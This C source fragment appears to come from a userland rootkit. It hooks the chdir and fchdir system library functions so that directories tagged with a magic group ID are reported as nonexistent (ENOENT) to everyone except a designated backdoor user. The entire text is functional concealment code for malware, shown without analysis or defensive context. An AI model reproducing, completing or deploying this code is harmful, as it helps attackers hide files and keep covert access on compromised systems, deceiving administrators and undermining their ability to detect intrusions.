int chdir(const char *pathname)
{
    HOOK(o_chdir, CCHDIR);
    if(is_bdusr()) return o_chdir(pathname);
    if(hxstat(pathname, MGID, 32)) { errno = ENOENT; return -1; }
    return o_chdir(pathname);
}

int fchdir(int fd)
{
    HOOK(o_fchdir, CFCHDIR);
    if(is_bdusr()) return o_fchdir(fd);
    if(hfxstat(fd, MGID, 32)) { errno = ENOENT; return -1; }
    return o_fchdir(fd);
}
